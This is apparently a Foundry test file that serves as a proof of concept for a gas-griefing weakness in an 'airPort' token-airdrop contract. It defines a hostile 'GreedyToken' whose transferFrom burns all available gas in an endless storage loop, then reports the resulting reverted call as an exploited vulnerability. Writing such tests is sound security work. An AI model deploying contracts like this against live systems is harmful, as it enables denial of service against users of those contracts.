// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x4b71ad9c1a84b9b643aa54fdd66e2dec96e8b152.sol";

contract GreedyToken {
    function transferFrom(address, address, uint256) public returns (bool) {
        uint256 i;
        // Burn all available gas with repeated storage operations
        while (true) {
            assembly {
                sstore(i, 1) // Burns ~20,000 gas per iteration
            }
            i++;
        }
        return false;
    }
}

contract AirPortGasTest is Test {
    airPort public ap;
    GreedyToken public greedyToken;

    function setUp() public {
        ap = new airPort();
        greedyToken = new GreedyToken();
    }

    function testTransferFailsWithGasOverconsumption() public {
        // Prepare transfer parameters
        address from = address(this);
        address tokenAddress = address(greedyToken);
        address[] memory recipients = new address[](1);
        recipients[0] = address(0x123);
        uint256 amount = 10;

        bytes memory payload = abi.encodeWithSelector(
            ap.transfer.selector,
            from,
            tokenAddress,
            recipients,
            amount
        );
        
        console2.log("--- BEFORE-Trigger State ---");
        console2.log("Ready to call airPort.transfer with 75,000 gas limit");
        
        console2.log("--- Trigger: Execute low-gas call (75,000 gas) ---");
        (bool success, ) = address(ap).call{gas: 75000}(payload);
        
        console2.log("--- AFTER-Trigger State ---");
        console2.log("Call status: %s", success ? "Success" : "Failed");
        
        // Determine final verdict
        if (!success) {
            console2.log("Vulnerability Exists: The call reverted due to gas overconsumption (vulnerability exploited)");
        } else {
            console2.log("Vulnerability not Exist: The call succeeded (vulnerability not exploited)");
        }
        
        // Maintain original assertion for test framework
        assertFalse(success, "Transfer should revert due to out-of-gas");
    }
}